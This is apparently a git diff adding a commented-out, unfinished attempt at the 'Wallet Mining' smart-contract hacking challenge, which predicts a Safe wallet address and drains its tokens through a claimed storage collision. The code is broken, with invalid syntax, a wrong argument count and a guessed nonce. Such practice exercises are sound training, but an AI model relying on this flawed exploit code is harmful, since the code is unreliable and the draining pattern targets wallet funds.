@@ -11,6 +11,7 @@ import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -34,6 +35,10 @@ contract WalletMiningChallenge is Test {
     Safe singletonCopy;
 
     uint256 initialWalletDeployerTokenBalance;
+
+    // // Declare the missing variables
+    // bytes32 memory initializer = ""; // Initialize with appropriate value
+    // uint256 nonce = 0; // Initialize with appropriate value
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -122,9 +127,53 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {
+    // function test_walletMining() public checkSolvedByPlayer {
+
+    //     bytes memory initializer = abi.encodeWithSignature(
+    //     "setup(address[],uint256,address,bytes,address,address,uint256,address)");
         
-    }
+    //     // Define nonce
+    //     uint256 nonce = 13; // This needs to be derived based on the challenge logic
+
+        
+    //     // Compute the predicted address of the Safe wallet using CREATE2
+    //     bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+    //     bytes32 creationCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));
+        
+    //     address predictedWalletAddress = address(uint160(uint256(keccak256(
+    //         abi.encodePacked(
+    //             hex"ff",
+    //             address(proxyFactory),
+    //             salt,
+    //             creationCodeHash
+    //         )
+    //     ))));
+    //     // Ensure the computed address matches the expected USER_DEPOSIT_ADDRESS
+    //     require(predictedWalletAddress == USER_DEPOSIT_ADDRESS, "Incorrect wallet address computed");
+
+    //     // Deploy the Safe wallet using createProxyWithNonce()
+    //     vm.startPrank(player);
+    //     walletDeployer.drop(nonce, initializer);
+    //     vm.stopPrank();
+
+    //     // Exploit the storage collision in AuthorizerUpgradeable to change the guardian
+    //     vm.startPrank(user);
+    //     Safe userSafe = Safe(payable(USER_DEPOSIT_ADDRESS));
+    //     userSafe.setup(
+    //         new address, // No owners initially
+    //         1,                 // Required confirmations
+    //         address(this),     // Setup address
+    //         hex"",             // Fallback handler data
+    //         address(0),        // No fallback handler
+    //         0,                 // No payment
+    //         address(0)         // No payment receiver
+    //     );
+
+    //     // Transfer funds from the Safe to the ward address
+    //     token.transfer(ward, token.balanceOf(USER_DEPOSIT_ADDRESS));
+    //     vm.stopPrank();
+    // }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
